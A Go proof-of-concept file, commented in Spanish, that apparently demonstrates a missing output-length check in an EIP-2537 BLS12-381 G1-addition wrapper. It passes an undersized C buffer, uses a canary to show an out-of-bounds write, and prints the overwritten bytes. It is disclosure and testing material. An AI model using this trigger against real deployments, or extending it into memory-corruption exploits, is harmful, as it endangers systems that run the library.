package main

/*
#include <stdlib.h>
*/
import "C"
import (
	"fmt"
	"unsafe"

	"github.com/consensys/gnark-crypto/ecc/bls12-381"
)

// PoC real: eip2537blsG1Add() (gnark-eip-2537.go) recibe cOutputLen
// (documentado como "javaOutputBuf must be at least EIP2537PreallocateForG1
// bytes (128) to safely store the result") pero NUNCA lo valida.
// nonMontgomeryMarshal() escribe directo con C.memcpy usando aritmetica de
// punteros cruda sobre el puntero recibido, sin chequear el tamano real del
// buffer. Este repro pasa un input VALIDO (dos puntos G1 reales en la curva,
// generados con gnark-crypto real) pero un output buffer deliberadamente
// mas chico que los 128 bytes documentados.
func main() {
	_, _, g1Aff, _ := bls12381.Generators()

	tmp := C.malloc(128)
	defer C.free(tmp)
	nonMontgomeryMarshalG1(&g1Aff, (*C.char)(tmp))
	point128 := C.GoBytes(tmp, 128)

	input := append(append([]byte{}, point128...), point128...)

	outputCap := 16
	canarySize := 64
	totalAlloc := C.malloc(C.size_t(outputCap + canarySize))
	defer C.free(totalAlloc)

	fullSlice := unsafe.Slice((*byte)(totalAlloc), outputCap+canarySize)
	for i := range fullSlice {
		fullSlice[i] = 0xCC
	}

	errBuf := C.malloc(256)
	defer C.free(errBuf)

	inputPtr := (*C.char)(unsafe.Pointer(&input[0]))
	outputPtr := (*C.char)(totalAlloc)
	errPtr := (*C.char)(errBuf)

	fmt.Printf("Input valido: 2 puntos G1 reales (%d bytes)\n", len(input))
	fmt.Printf("Output buffer declarado: %d bytes (bien mas chico que los 128 documentados)\n", outputCap)
	fmt.Println("Canary de 64 bytes (0xCC) inmediatamente despues del buffer, en memoria C real...")

	ret := eip2537blsG1Add(inputPtr, outputPtr, errPtr, C.int(len(input)), C.int(outputCap), C.int(256))

	fmt.Printf("eip2537blsG1Add retorno = %d (0=exito, 1=error)\n", int(ret))

	overwritten := 0
	firstBad := -1
	for i := outputCap; i < outputCap+canarySize; i++ {
		if fullSlice[i] != 0xCC {
			overwritten++
			if firstBad == -1 {
				firstBad = i - outputCap
			}
		}
	}
	fmt.Printf("bytes del canary sobreescritos mas alla del buffer de %d: %d de %d\n", outputCap, overwritten, canarySize)
	if overwritten > 0 {
		fmt.Printf("*** CONFIRMADO: escritura fuera de limites, empieza en offset +%d mas alla del cOutputLen=%d declarado ***\n", firstBad, outputCap)
		fmt.Println("hex de los primeros 32 bytes despues del buffer declarado:")
		end := outputCap + 32
		if end > len(fullSlice) {
			end = len(fullSlice)
		}
		fmt.Printf("%x\n", fullSlice[outputCap:end])
	} else {
		fmt.Println("no se detecto escritura fuera de limites en este intento")
	}
}
